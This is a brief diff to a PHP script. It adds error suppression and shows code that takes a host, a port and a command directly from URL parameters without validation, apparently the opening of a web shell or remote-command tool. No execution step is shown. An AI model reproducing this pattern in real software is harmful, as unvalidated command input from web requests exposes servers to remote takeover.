@@ -1,4 +1,6 @@
 <?php
+    error_reporting(0);
+    
     $host = urldecode($_GET['host']);
     $port = urldecode((int)$_GET['port']);
     $cmd = urldecode($_GET['cmd']);
